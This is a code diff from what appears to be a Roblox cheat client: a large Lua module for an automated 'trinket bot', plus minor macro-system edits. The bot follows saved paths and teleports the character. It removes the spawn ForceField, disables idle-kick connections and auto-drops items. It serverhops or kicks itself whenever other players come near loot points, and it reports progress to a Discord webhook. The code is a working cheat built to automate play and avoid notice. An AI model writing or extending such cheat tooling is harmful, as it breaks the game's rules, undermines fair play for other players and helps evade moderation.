+                                                    for i = 1, saved_closest_idx - 1 do
+                                                        table.insert(recovery_temp_path, recovery_original_path[i])
+                                                    end
+
+                                                    trinket_bot.path_points = recovery_temp_path
+                                                    trinket_bot.original_point_1_position = recovery_original_point_1_pos
+                                                    trinket_bot.skip_distance_check = true
+                                                    trinket_bot.path_running = false
+
+                                                    library:Notify(string.format("Resuming path with %d points after far recovery (starting from point %d)", #recovery_temp_path, saved_closest_idx))
+                                                    task.wait(0.5)
+
+                                                    if auto_start_death_connection then
+                                                        pcall(function() auto_start_death_connection:Disconnect() end)
+                                                        auto_start_death_connection = nil
+                                                    end
+
+                                                    ExecutePath(false)
+                                                    return
+                                                else
+                                                    library:Notify("Could not remove ForceField at saved position - falling back to gate recovery")
+                                                end
+                                            end
+
+                                            local path_has_gates_recovery = false
+                                            for _, check_point in ipairs(trinket_bot.path_points) do
+                                                if check_point.is_gate_point then
+                                                    path_has_gates_recovery = true
+                                                    break
+                                                end
+                                            end
+
+                                            if path_has_gates_recovery then
+                                                local recovery_gate_point = nil
+                                                local recovery_gate_index = nil
+                                                for idx = #trinket_bot.path_points, 1, -1 do
+                                                    if trinket_bot.path_points[idx].is_gate_point then
+                                                        recovery_gate_point = trinket_bot.path_points[idx]
+                                                        recovery_gate_index = idx
+                                                        break
+                                                    end
+                                                end
+
+                                                if recovery_gate_point then
+                                                    library:Notify(string.format("Far from path recovery - respawning before gating to last gate point %d", recovery_gate_index))
+                                                    task.wait(1)
+
+                                                    local prox_check_dist = Options.ProximityCheck and Options.ProximityCheck.Value or 0
+                                                    if prox_check_dist > 0 and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                                                        local char_pos = plr.Character.HumanoidRootPart.Position
+
+                                                        for _, other_player in next, plrs:GetPlayers() do
+                                                            if other_player ~= plr and other_player.Character and other_player.Character:FindFirstChild("HumanoidRootPart") then
+                                                                local dist = (other_player.Character.HumanoidRootPart.Position - char_pos).Magnitude
+
+                                                                if dist <= prox_check_dist then
+                                                                    library:Notify(string.format("Player %s within %d studs during far recovery - serverhopping", other_player.Name, math.floor(dist)))
+                                                                    SafeServerhop(string.format("Player %s within %d studs during far path recovery", other_player.Name, math.floor(prox_check_dist)))
+                                                                    return
+                                                                end
+                                                            end
+                                                        end
+                                                    end
+
+                                                    local gate_recovery_character = plr.Character
+                                                    local gate_recovery_ff_removed = false
+                                                    local gate_recovery_teleport_platform = nil
+
+                                                    if gate_recovery_character and FindFirstChild(gate_recovery_character, "HumanoidRootPart") then
+                                                        local hrp = gate_recovery_character.HumanoidRootPart
+
+                                                        gate_recovery_teleport_platform = Instance.new("Part")
+                                                        gate_recovery_teleport_platform.Size = Vector3.new(7, 1, 7)
+                                                        gate_recovery_teleport_platform.Position = hrp.Position + Vector3.new(0, -3, 18)
+                                                        gate_recovery_teleport_platform.Anchored = true
+                                                        gate_recovery_teleport_platform.CanCollide = true
+                                                        gate_recovery_teleport_platform.Transparency = 1
+                                                        gate_recovery_teleport_platform.Parent = workspace
+
+                                                        trinket_bot.path_running = true
+                                                        SmoothTeleport(gate_recovery_teleport_platform.Position + Vector3.new(0, 4, 0))
+                                                        task.wait(1.5)
+
+                                                        if gate_recovery_character and not FindFirstChildOfClass(gate_recovery_character, "ForceField") then
+                                                            gate_recovery_ff_removed = true
+                                                            library:Notify("ForceField removed for far path recovery")
+                                                        end
+
+                                                        if gate_recovery_teleport_platform then
+                                                            gate_recovery_teleport_platform:Destroy()
+                                                            gate_recovery_teleport_platform = nil
+                                                        end
+                                                    end
+
+                                                    if gate_recovery_ff_removed then
+                                                        library:Notify("ForceField removed - gating to last gate point for recovery")
+
+                                                        local recovery_gate_success = Gate(recovery_gate_point.gate_location)
+
+                                                        if recovery_gate_success then
+                                                            library:Notify(string.format("Successfully gated to last gate point %d - continuing to end then serverhopping", recovery_gate_index))
+
+                                                            local recovery_original_path = trinket_bot.path_points
+                                                            local recovery_temp_path = {}
+
+                                                            for idx = recovery_gate_index + 1, #recovery_original_path do
+                                                                table.insert(recovery_temp_path, recovery_original_path[idx])
+                                                            end
+
+                                                            trinket_bot.path_points = recovery_temp_path
+
+                                                            if #recovery_temp_path == 0 then
+                                                                library:Notify("Last gate point was final destination - serverhopping")
+                                                                trinket_bot.path_running = false
+                                                                TrinketBotServerhop("Completed path after far recovery gate")
+                                                                return
+                                                            end
+
+                                                            first_point = recovery_temp_path[1] and recovery_temp_path[1].position
+
+                                                            trinket_bot.skip_distance_check = true
+                                                            trinket_bot.path_running = false
+
+                                                            library:Notify(string.format("Resuming path with %d remaining points after far recovery", #recovery_temp_path))
+                                                            task.wait(0.5)
+
+                                                            if auto_start_death_connection then
+                                                                pcall(function() auto_start_death_connection:Disconnect() end)
+                                                                auto_start_death_connection = nil
+                                                            end
+
+                                                            ExecutePath(false)
+                                                            return
+                                                        else
+                                                            library:Notify("Far recovery gate failed - serverhopping")
+                                                            trinket_bot.path_running = false
+                                                            TrinketBotServerhop("Far recovery gate failed after ForceField removal")
+                                                            return
+                                                        end
+                                                    else
+                                                        library:Notify("Could not remove ForceField for far recovery - serverhopping")
+                                                        trinket_bot.path_running = false
+                                                        TrinketBotServerhop("Failed to remove ForceField for far recovery gate")
+                                                        return
+                                                    end
+                                                else
+                                                    library:Notify("No gate points found for far recovery - serverhopping")
+                                                    TrinketBotServerhop("No gate points in path for far recovery")
+                                                    return
+                                                end
+                                            else
+                                                library:Notify(string.format("Too far from path (%.1f studs) and no gates available - serverhopping", closest_distance))
+                                                utility:plain_webhook(string.format("Bot too far from path (%.1f studs) with no gates - serverhopping", closest_distance))
+                                                TrinketBotServerhop("Too far from path with no gates for recovery")
+                                                return
+                                            end
+                                        end
+                                    end
+                                end
+
+                                local stay_in_server_check = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                                if not stay_in_server_check then
+                                    local camper_found = false
+                                    local camper_name = ""
+                                    local camper_distance = 0
+
+                                    for _, other_player in next, plrs:GetPlayers() do
+                                        if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                            local player_distance = (other_player.Character.HumanoidRootPart.Position - first_point).Magnitude
+                                            if player_distance <= 100 then
+                                                camper_found = true
+                                                camper_name = other_player.Name
+                                                camper_distance = player_distance
+                                                break
+                                            end
+                                        end
+                                    end
+
+                                    if camper_found then
+                                        library:Notify(string.format("Player %s is near point 1 (%.0f studs). Waiting 10s...", camper_name, camper_distance))
+                                        task.wait(10)
+
+                                        local still_camping = false
+                                        for _, other_player in next, plrs:GetPlayers() do
+                                            if other_player.Name == camper_name and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                                local new_distance = (other_player.Character.HumanoidRootPart.Position - first_point).Magnitude
+                                                if new_distance <= 100 then
+                                                    still_camping = true
+                                                    camper_distance = new_distance
+                                                    break
+                                                end
+                                            end
+                                        end
+
+                                        if still_camping then
+                                            library:Notify(string.format("Player %s still at point 1; Skipping server...", camper_name))
+                                            task.wait(0.5)
+                                            TrinketBotServerhop(string.format("PLAYER CAMPING POINT 1: %s (%.0f studs) - Skipping server", camper_name, camper_distance))
+                                            return
+                                        else
+                                            library:Notify(string.format("Player %s moved away. Continuing...", camper_name))
+                                        end
+                                    end
+
+                                    local path_has_gates = false
+                                    for _, check_point in ipairs(trinket_bot.path_points) do
+                                        if check_point.is_gate_point then
+                                            path_has_gates = true
+                                            break
+                                        end
+                                    end
+
+                                    if not path_has_gates then
+                                        for point_idx, path_point in ipairs(trinket_bot.path_points) do
+                                            if path_point.wait_for_trinket then
+                                                for _, other_player in next, plrs:GetPlayers() do
+                                                    if other_player ~= plr and other_player.Character and FindFirstChild(other_player.Character, "HumanoidRootPart") then
+                                                        local player_distance = (other_player.Character.HumanoidRootPart.Position - path_point.position).Magnitude
+                                                        if player_distance <= 150 then
+                                                            library:Notify(string.format("Player %s is on the trinket point %d (%.0f studs)! Skipping server...", other_player.Name, point_idx, player_distance))
+                                                            task.wait(0.5)
+                                                            TrinketBotServerhop(string.format("Player is already on the trinket point %d: %s (%.0f studs) - Skipping server", point_idx, other_player.Name, player_distance))
+                                                            return
+                                                        end
+                                                    end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+
+                            library:Notify("Setting up the trinket bot...")
+                            task.wait(2)
+
+                            if auto_start_death_connection then
+                                pcall(function() auto_start_death_connection:Disconnect() end)
+                                auto_start_death_connection = nil
+                            end
+
+                            ExecutePath(false)
+                        else
+                            if auto_start_death_connection then
+                                pcall(function() auto_start_death_connection:Disconnect() end)
+                                auto_start_death_connection = nil
+                            end
+                            utility:plain_webhook("@everyone CRITICAL: Character lost after path load during auto-start - kicking for safety")
+                            library:Notify("CRITICAL: Character lost after path load - kicking")
+                            mem:RemoveItem("botstarted")
+                            task.wait(0.5)
+                            plr:Kick("Character lost after path load during auto-start")
+                            return
+                        end
+                    end
+                end
+            end)
+
+            current_path_label = group_trinket_config:AddLabel("Currently Editing: None")
+            group_trinket_config:AddDivider()
+
+            group_trinket_config:AddInput("PathName", {
+                Text = "Path Name",
+                Default = "",
+                Placeholder = "Enter new path name to save..."
+            })
+
+            group_trinket_config:AddButton({
+                Text = "New Path",
+                Func = function()
+                    trinket_bot.path_points = {}
+                    update_path_label(nil)
+                    update_visualizations()
+
+                    if Options.PathName then
+                        Options.PathName:SetValue("")
+                    end
+
+                    if Options.SavedPaths then
+                        Options.SavedPaths:SetValue(nil)
+                    end
+
+                    library:Notify("Started new path - enter a name before saving")
+                end
+            })
+
+            group_trinket_config:AddDivider()
+
+            local saved_paths = get_saved_paths()
+            group_trinket_config:AddDropdown("SavedPaths", {
+                Text = "Saved Paths",
+                Values = saved_paths,
+                Multi = false,
+                Callback = function(value)
+                    load_path_by_name(value)
+                end
+            })
+
+            group_trinket_config:AddButton({
+                Text = "Refresh Paths",
+                Func = function()
+                    local paths = get_saved_paths()
+                    if Options.SavedPaths then
+                        Options.SavedPaths:SetValues(paths)
+                        library:Notify(string.format("Found %d saved paths", #paths))
+                    end
+                end
+            })
+
+            group_trinket_config:AddButton({
+                Text = "Save Path",
+                Func = function()
+                    local path_name = Options.PathName and Options.PathName.Value or ""
+                    if path_name == "" then
+                        library:Notify("Please enter a path name!")
+                        return
+                    end
+
+                    if #trinket_bot.path_points == 0 then
+                        library:Notify("No points to save!")
+                        return
+                    end
+
+                    if not writefile then
+                        library:Notify("writefile not supported!")
+                        return
+                    end
+
+                    local folder_path = "HYDROXIDE/trinket_paths"
+                    if not isfolder or not isfolder(folder_path) then
+                        if makefolder then
+                            makefolder(folder_path)
+                        end
+                    end
+
+                    local httpService = Services.HttpService
+                    local serialized_points = {}
+                    for i, point in ipairs(trinket_bot.path_points) do
+                        table.insert(serialized_points, {
+                            x = point.position.X,
+                            y = point.position.Y,
+                            z = point.position.Z,
+                            wait_for_trinket = point.wait_for_trinket,
+                            wait_time = point.wait_time or 0,
+                            is_gate_point = point.is_gate_point or false,
+                            gate_location = point.gate_location
+                        })
+                    end
+
+                    local save_data = {
+                        points = serialized_points,
+                        settings = {
+                            skip_illusionist = Toggles.SkipIllusionist and Toggles.SkipIllusionist.Value or false,
+                            pickup_scrolls = Toggles.PickupScrolls and Toggles.PickupScrolls.Value or false,
+                            pickup_ice_essence = Toggles.PickupIceEssence and Toggles.PickupIceEssence.Value or false,
+                            pickup_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {},
+                            pickup_event_items = Toggles.PickupEventItems and Toggles.PickupEventItems.Value or false,
+                            pickup_trinkets = Toggles.PickupTrinkets and Toggles.PickupTrinkets.Value or false,
+                            disable_gpu_rendering = Toggles.DisableGPURendering and Toggles.DisableGPURendering.Value or false,
+                            emergency_serverhop_conditions = Options.EmergencyServerhopConditions and Options.EmergencyServerhopConditions.Value or {},
+                            join_oldest_server = Toggles.JoinOldestServer and Toggles.JoinOldestServer.Value or false,
+                            menu_on_non_23 = Toggles.MenuOnNon23 and Toggles.MenuOnNon23.Value or false,
+                            auto_pop_pds = Toggles.AutoPopPDs and Toggles.AutoPopPDs.Value or false,
+                            auto_drop_items = Options.AutoDropItems and Options.AutoDropItems.Value or {},
+                            kick_on_trinket = Toggles.KickOnTrinket and Toggles.KickOnTrinket.Value or false,
+                            kick_trinket_list = Options.KickTrinketList and Options.KickTrinketList.Value or {},
+                            stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false,
+                            reequip_gate_in_loop = Toggles.ReequipGateInLoop == nil and true or Toggles.ReequipGateInLoop.Value,
+                            time_between_looting = Options.TimeBetweenLooting and Options.TimeBetweenLooting.Value or 5,
+                            proximity_check = Options.ProximityCheck and Options.ProximityCheck.Value or 0,
+                            critical_distance = Options.CriticalDistance and Options.CriticalDistance.Value or 60,
+                            min_player_count = Options.MinPlayerCount and Options.MinPlayerCount.Value or 0,
+                            speed = Options.TrinketBotSpeed and Options.TrinketBotSpeed.Value or 100,
+                            show_in_artifact_stream = Toggles.show_in_artifact_stream and Toggles.show_in_artifact_stream.Value or false
+                        }
+                    }
+
+                    local file_path = folder_path .. "/" .. path_name .. ".json"
+                    local is_overwrite = isfile and isfile(file_path)
+
+                    local success, err = pcall(function()
+                        local json = httpService:JSONEncode(save_data)
+                        writefile(file_path, json)
+                    end)
+
+                    if success then
+                        if is_overwrite then
+                            library:Notify(string.format("Overwritten path '%s' with %d points", path_name, #trinket_bot.path_points))
+                        else
+                            library:Notify(string.format("Saved path '%s' with %d points", path_name, #trinket_bot.path_points))
+                        end
+
+                        update_path_label(path_name)
+                        if Options.SavedPaths then
+                            local paths = get_saved_paths()
+                            Options.SavedPaths:SetValues(paths)
+                            Options.SavedPaths:SetValue(path_name)
+                        end
+                    else
+                        library:Notify("Failed to save path: " .. tostring(err))
+                    end
+                end
+            })
+
+            group_trinket_config:AddButton({
+                Text = "Delete Path",
+                Func = function()
+                    local path_name = Options.SavedPaths and Options.SavedPaths.Value or ""
+                    if path_name == "" then
+                        library:Notify("Please select a path to delete!")
+                        return
+                    end
+
+                    if not delfile or not isfile then
+                        library:Notify("delfile/isfile not supported!")
+                        return
+                    end
+
+                    local file_path = "HYDROXIDE/trinket_paths/" .. path_name .. ".json"
+
+                    if not isfile(file_path) then
+                        library:Notify(string.format("Path '%s' not found!", path_name))
+                        return
+                    end
+
+                    local success, err = pcall(function()
+                        delfile(file_path)
+                    end)
+
+                    if success then
+                        library:Notify(string.format("Deleted path '%s'", path_name))
+                        update_path_label(nil)
+
+                        local paths = get_saved_paths()
+                        if Options.SavedPaths then
+                            Options.SavedPaths:SetValues(paths)
+                            Options.SavedPaths:SetValue(nil)
+                        end
+
+                        trinket_bot.path_points = {}
+                        update_visualizations()
+                    else
+                        library:Notify("Failed to delete path: " .. tostring(err))
+                    end
+                end
+            })
+
+            group_trinket_config:AddDivider()
+
+            group_trinket_config:AddButton("start_path", {
+                Text = "Start Path",
+                Tooltip = "Requires Blatant Mode to be enabled",
+                Func = function()
+                    task.spawn(ExecutePath, false)
+                end
+            })
+
+            group_trinket_config:AddButton("test_path", {
+                Text = "Test Path",
+                Tooltip = "Requires Blatant Mode to be enabled",
+                Func = function()
+                    task.spawn(ExecutePath, true)
+                end
+            })
+
+            local stop_button = group_trinket_config:AddButton("stop_bot", {
+                Text = "Stop Bot",
+                Tooltip = "Stop the currently running bot",
+                Func = function()
+                    if trinket_bot.path_running then
+                        trinket_bot.path_running = false
+                        mem:RemoveItem("botstarted")
+                        mem:RemoveItem("serverhop_count")
+
+                        kick_after_path = false
+                        kick_debounce = false
+                        kick_trinket_name = ""
+
+                        current_gate_section = 0
+                        player_encounters = {}
+                        emergency_gate_requested = nil
+                        proximity_warnings = {}
+                        proximity_repeat_players = {}
+                        mana_initialized = false
+                        trinket_bot.pending_artifact_logs = {}
+
+                        if cpu and cpu.status and cpu.status.active then
+                            cpu.status.active = false
+                            setfpscap(240)
+                            settings().Rendering.QualityLevel = cpu.services.ql
+                            cpu.services.rs:Set3dRenderingEnabled(true)
+                        end
+
+                        for _, connection in next, getconnections(plr.Idled) do
+                            connection:Enable()
+                        end
+
+                        if loot_tracking_connection then
+                            pcall(function() loot_tracking_connection:Disconnect() end)
+                            loot_tracking_connection = nil
+                        end
+                        for _, conn in ipairs(quantity_connections) do
+                            if conn then
+                                pcall(function() conn:Disconnect() end)
+                            end
+                        end
+                        quantity_connections = {}
+                        droppedTools = {}
+
+                        visited_positions = {}
+
+                        if shared.playerAddedConnection then
+                            shared.playerAddedConnection:Disconnect()
+                            shared.playerAddedConnection = nil
+                        end
+                        if shared.day_farm_player_connections then
+                            for player, conn in pairs(shared.day_farm_player_connections) do
+                                if conn and conn.Disconnect then
+                                    conn:Disconnect()
+                                end
+                            end
+                            shared.day_farm_player_connections = {}
+                        end
+                        if shared.deathConnection then
+                            shared.deathConnection:Disconnect()
+                            shared.deathConnection = nil
+                        end
+                        if shared.characterAddedConnection then
+                            shared.characterAddedConnection:Disconnect()
+                            shared.characterAddedConnection = nil
+                        end
+
+                        for _, part in ipairs(trinket_bot.point_visualizations) do
+                            if part and part.Parent then
+                                part:Destroy()
+                            end
+                        end
+                        trinket_bot.point_visualizations = {}
+
+                        if trinket_bot.connections then
+                            for name, conn in pairs(trinket_bot.connections) do
+                                if conn then
+                                    pcall(function() conn:Disconnect() end)
+                                end
+                            end
+                            trinket_bot.connections = {}
+                        end
+
+                        if trinket_bot.illu_connections then
+                            for _, conn in ipairs(trinket_bot.illu_connections) do
+                                if conn then
+                                    pcall(function() conn:Disconnect() end)
+                                end
+                            end
+                            trinket_bot.illu_connections = {}
+                        end
+
+                        if trinket_bot.gnav_connections then
+                            for _, conn in ipairs(trinket_bot.gnav_connections) do
+                                if conn then
+                                    pcall(function() conn:Disconnect() end)
+                                end
+                            end
+                            trinket_bot.gnav_connections = {}
+                        end
+
+                        if active_tween_data then
+                            if active_tween_data.tween then
+                                pcall(function() active_tween_data.tween:Cancel() end)
+                                active_tween_data.tween = nil
+                            end
+                            if active_tween_data.connection then
+                                pcall(function() active_tween_data.connection:Disconnect() end)
+                                active_tween_data.connection = nil
+                            end
+                        end
+
+                        restore_bot_state()
+
+                        if trinket_bot.visualize_enabled then
+                            update_visualizations()
+                        end
+
+                        library:Notify("Bot manually stopped")
+                    else
+                        local was_botstarted = mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true"
+                        trinket_bot.path_running = false
+                        mem:RemoveItem("botstarted")
+                        mem:RemoveItem("serverhop_count")
+
+                        if was_botstarted then
+                            library:Notify("Bot state reset (was in inconsistent state)")
+                        else
+                            library:Notify("Bot is not running")
+                        end
+                    end
+                end
+            })
+
+            stop_button:SetVisible(false)
+
+            task.spawn(function()
+                while shared and not shared.is_unloading and task.wait(0.5) do
+                    local is_running = trinket_bot.path_running or (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true")
+                    stop_button:SetVisible(is_running)
+                end
+            end)
+
+            local group_trinket_looping = Tabs.Botting:AddRightGroupbox("Looping Settings")
+
+            group_trinket_looping:AddToggle("StayInServer", {
+                Text = "Stay in Server",
+                Default = false,
+                Tooltip = "Loops the path in the same server instead of serverhopping"
+            })
+
+            group_trinket_looping:AddToggle("MenuOnNon23", {
+                Text = "Menu on NON-23",
+                Default = false,
+                Tooltip = "Menus and stops botting if the current server drops below 23 players"
+            })
+
+            group_trinket_looping:AddToggle("ReequipGateInLoop", {
+                Text = "Re-equip Gate in Loop",
+                Default = cheat_client.config.reequip_gate_in_loop,
+                Tooltip = "Automatically re-equip gate tool if it gets unequipped during botting"
+            })
+
+            group_trinket_looping:AddSlider("TimeBetweenLooting", {
+                Text = "Time Between Looting",
+                Default = 5,
+                Min = 0,
+                Max = 30,
+                Rounding = 0,
+                Suffix = "m",
+                Tooltip = "Wait time before respawning and restarting path (in minutes)"
+            })
+
+            if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 then
+                local lives_table = {
+                    ["Azael"] = 2,
+                    ["Kasparan"] = 4,
+                    ["Cameo"] = 9
+                }
+
+                local function can_pop_pd()
+                    if not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                        return false
+                    end
+
+                    if not (Toggles.AutoPopPDs and Toggles.AutoPopPDs.Value) then
+                        return false
+                    end
+
+                    local lives = Get("Lives")
+                    if not lives then return false end
+
+                    local race = Get("Race")
+                    if not race then return false end
+
+                    local days_survived = Get("DaysSurvived")
+                    if not days_survived then return false end
+
+                    local max_lives = lives_table[race] or 3
+
+                    if lives >= max_lives then
+                        return false
+                    end
+
+                    local last_pd_key = "last_pd_day_" .. plr.UserId
+                    if mem:HasItem(last_pd_key) then
+                        local last_pd_day = tonumber(mem:GetItem(last_pd_key))
+                        if last_pd_day == days_survived then
+                            return false
+                        end
+                    end
+
+                    return true, days_survived
+                end
+
+                local function try_pop_pd()
+                    local can_pop, current_day = can_pop_pd()
+                    if not can_pop then return end
+
+                    local old_lives = Get("Lives")
+                    if not old_lives then return end
+
+                    if not plr.Backpack then return end
+                    local pd = FindFirstChild(plr.Backpack, "Phoenix Down")
+                    if pd and pd:IsA("Tool") then
+                        local character = plr.Character
+                        if character and FindFirstChild(character, "Humanoid") then
+                            character.Humanoid:EquipTool(pd)
+
+                            task.spawn(function()
+                                local timeout = tick() + 5
+                                while pd.Parent ~= character and tick() < timeout do
+                                    task.wait()
+                                end
+
+                                if pd.Parent == character then
+                                    pd:Activate()
+                                    local last_pd_key = "last_pd_day_" .. plr.UserId
+                                    mem:SetItem(last_pd_key, tostring(current_day))
+
+                                    task.wait(1)
+                                    local new_lives = Get("Lives")
+                                    if new_lives then
+                                        local msg = string.format("Auto Popped Phoenix Down: %d → %d lives", old_lives, new_lives)
+                                        library:Notify(msg)
+                                        local server_name, server_region = get_server_info()
+
+                                        local player_count = #plrs:GetPlayers()
+                                        local footer_text
+                                        if cheat_client.config.webhook_show_username ~= false then
+                                            footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                                        else
+                                            footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
+                                        end
+
+                                        local embed = {
+                                            title = "Auto Popped Phoenix Down",
+                                            description = string.format(
+                                                "**Server:** `%s (%s)`\n**Lives:** `%d → %d`",
+                                                server_name ~= "" and server_name or "Unknown",
+                                                server_region ~= "" and server_region or "Unknown",
+                                                old_lives,
+                                                new_lives
+                                            ),
+                                            color = 0xFFAE00,
+                                            footer = {
+                                                text = footer_text
+                                            },
+                                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                                        }
+
+                                        if cheat_client.config.webhook and cheat_client.config.webhook ~= "" then
+                                            task.spawn(function()
+                                                pcall(function()
+                                                    HXD_SEND_WEBHOOK(cheat_client.config.webhook, {
+                                                        username = cheat_client.config.webhook_username or "bladee",
+                                                        embeds = {embed}
+                                                    })
+                                                end)
+                                            end)
+                                        end
+                                    else
+                                        library:Notify("Used Phoenix Down!")
+                                    end
+                                end
+                            end)
+                        end
+                    end
+                end
+
+                pd_char_connection = utility:Connection(plr.CharacterAdded, function(character)
+                    character:WaitForChild("Humanoid", 10)
+                    task.wait(1)
+                    try_pop_pd()
+                end)
+
+                task.spawn(function()
+                    while shared and not shared.is_unloading do
+                        try_pop_pd()
+                        task.wait(15)
+                    end
+                end)
+            end
+
+            local function drop_item(item)
+                if not (mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true") then
+                    return
+                end
+
+                if not plr.Character or not plr.Character:FindFirstChild("Humanoid") then
+                    return
+                end
+
+                while currently_dropping do
+                    task.wait(0.1)
+                end
+                currently_dropping = true
+
+                if not (Options.AutoDropItems and Options.AutoDropItems.Value) then
+                    currently_dropping = false
+                    return
+                end
+
+                if droppedTools[item.Name] then
+                    currently_dropping = false
+                    return
+                end
+                local selected_items = Options.AutoDropItems.Value
+                local should_drop = false
+
+                for dropdown_name, enabled in pairs(selected_items) do
+                    if enabled and item.Name:gsub(" ", "") == dropdown_name:gsub(" ", "") then
+                        should_drop = true
+                        break
+                    end
+                end
+
+                if not should_drop then
+                    currently_dropping = false
+                    return
+                end
+
+                if should_drop then
+                    droppedTools[item.Name] = true
+
+                    local character = plr.Character
+                    if character and character:FindFirstChild("Humanoid") then
+                        local is_scroll = item.Name:lower():find("scroll of") ~= nil
+                        local is_ice_essence = item.Name == "Ice Essence"
+                        local should_try_use = is_scroll or is_ice_essence
+
+                        local equip_success = pcall(function()
+                            character.Humanoid:EquipTool(item)
+                        end)
+
+                        if not equip_success then
+                            print("[DEBUG] Failed to equip item for dropping")
+                            droppedTools[item.Name] = nil
+                            currently_dropping = false
+                            return
+                        end
+
+                        local start_time = tick()
+                        local timeout = 3
+                        while item.Parent ~= character and (tick() - start_time) < timeout do
+                            task.wait(0.1)
+                        end
+
+                        if item.Parent ~= character then
+                            print(string.format("[DEBUG] Timeout waiting for %s to equip", item.Name))
+                            droppedTools[item.Name] = nil
+                            currently_dropping = false
+                            return
+                        end
+
+                        if should_try_use then
+                            library:Notify(string.format("Attempting to use %s before dropping...", item.Name))
+                            task.wait(0.1)
+
+                            task.spawn(function()
+                                if vim then
+                                    vim:SendMouseButtonEvent(0, 0, 0, true, game, 1)
+                                    task.wait(math.random(1, 15) / 1000)
+                                    vim:SendMouseButtonEvent(0, 0, 0, false, game, 1)
+                                end
+                            end)
+
+                            if utility and utility.LeftClick then
+                                utility:LeftClick()
+                            end
+
+                            task.wait(0.5)
+
+                            if not item or not item.Parent or (item.Parent ~= character and item.Parent ~= plr.Backpack) then
+                                library:Notify(string.format("Used %s successfully!", item.Name))
+                                droppedTools[item.Name] = nil
+                                currently_dropping = false
+                                return
+                            end
+
+                            library:Notify(string.format("Could not use %s, dropping instead...", item.Name))
+
+                            if item.Parent == plr.Backpack then
+                                pcall(function()
+                                    character.Humanoid:EquipTool(item)
+                                end)
+                                task.wait(0.3)
+                            end
+                        end
+
+                        task.wait(0.075)
+                        vim:SendKeyEvent(true, Enum.KeyCode.Backspace, false, game)
+                        task.wait()
+                        vim:SendKeyEvent(false, Enum.KeyCode.Backspace, false, game)
+                        library:Notify(string.format("Dropped %s", item.Name))
+
+                        local item_name = item.Name
+                        task.delay(2, function()
+                            droppedTools[item_name] = nil
+                        end)
+
+                        task.wait(0.3)
+                    end
+
+                    currently_dropping = false
+                end
+            end
+
+            local function setup_backpack_monitoring()
+                if auto_drop_backpack_connection then
+                    auto_drop_backpack_connection:Disconnect()
+                    auto_drop_backpack_connection = nil
+                end
+
+                local backpack = plr:WaitForChild("Backpack", 55)
+                if not backpack then
+                    warn("[DEBUG] Failed to find backpack after 55 seconds")
+                    return
+                end
+
+                if not utility then
+                    return
+                end
+
+                auto_drop_backpack_connection = utility:Connection(backpack.ChildAdded, function(obj)
+                    if not obj then return end
+
+                    local bot_started = mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true"
+                    if not bot_started then return end
+
+                    if not obj:IsA("Tool") then return end
+
+                    task.wait(0.05)
+
+                    if not kick_debounce and Toggles.KickOnTrinket and Toggles.KickOnTrinket.Value and Options.KickTrinketList and Options.KickTrinketList.Value then
+                        local selected_trinkets = Options.KickTrinketList.Value
+                        for trinket_name, _ in next, selected_trinkets do
+                            if obj.Name:gsub(" ", "") == trinket_name:gsub(" ", "") then
+                                kick_debounce = true
+                                kick_after_path = true
+                                kick_trinket_name = trinket_name
+                                print(string.format("[Kick on Trinket] MATCH FOUND: %s - will kick after reaching last point", obj.Name))
+                                utility:plain_webhook(string.format("@here %s found! Going to last point then kicking.", trinket_name))
+                                library:Notify(string.format("%s found! Going to last point...", trinket_name))
+                                return
+                            end
+                        end
+                    end
+
+                    task.wait(0.67)
+
+                    for _, item in ipairs(backpack:GetChildren()) do
+                        if item then
+                            local success, is_tool = pcall(function() return item:IsA("Tool") end)
+                            if success and is_tool and not droppedTools[item.Name] then
+                                task.spawn(drop_item, item)
+                            end
+                        end
+                    end
+                end)
+            end
+
+            task.spawn(setup_backpack_monitoring)
+            auto_drop_char_connection = utility:Connection(plr.CharacterAdded, function()
+                task.wait(2.5)
+                setup_backpack_monitoring()
+            end)
+        end
+
+        do
             local macro_system = {
                 current_actions = {},
                 loaded_macros = {},
@@ -8321,14 +19327,11 @@ if game.PlaceId == 100010170789226 then
                                         local hum = character:FindFirstChildOfClass("Humanoid")
                                         if not hum then return end
 
-                                        -- Check if tool is already equipped
                                         local equipped_tool = character:FindFirstChild(kb.tool)
 
                                         if equipped_tool and equipped_tool:IsA("Tool") then
-                                            -- Unequip if already equipped
                                             hum:UnequipTools()
                                         else
-                                            -- Find and equip if not equipped
                                             local tool = find_tool(kb.tool)
                                             if tool then
                                                 hum:EquipTool(tool)
@@ -8608,7 +19611,7 @@ if game.PlaceId == 100010170789226 then
             local active_macro_toggles = {}
 
             local function save_macro_state()
-                local httpService = httt
+                local httpService = Services.HttpService
                 pcall(function()
                     local shared_settings = {}
                     if mem:HasItem("shared_settings") then
@@ -8633,7 +19636,7 @@ if game.PlaceId == 100010170789226 then
             end
 
             local function load_macro_state()
-                local httpService = httt
+                local httpService = Services.HttpService
                 local macros_to_load = {}
 
                 if mem:HasItem("shared_settings") then
@@ -8873,7 +19876,7 @@ if game.PlaceId == 100010170789226 then
                         saved_dropdown:SetValues(get_macros())
                         library:Notify("Deleted: " .. selected_macro_name)
                         selected_macro_name = ""
-                        save_macro_state()  -- Update persistence after deletion
+                        save_macro_state()
                     end
                 end
             })
@@ -8963,7 +19966,7 @@ if game.PlaceId == 100010170789226 then
             })
 
             task.spawn(function()
-                task.wait(0.5)  -- Wait for UI to initialize
+                task.wait(0.5)
                 local macros_to_load = load_macro_state()
                 if #macros_to_load > 0 then
                     library:Notify(string.format("Restoring %d macro(s) from previous session...", #macros_to_load))
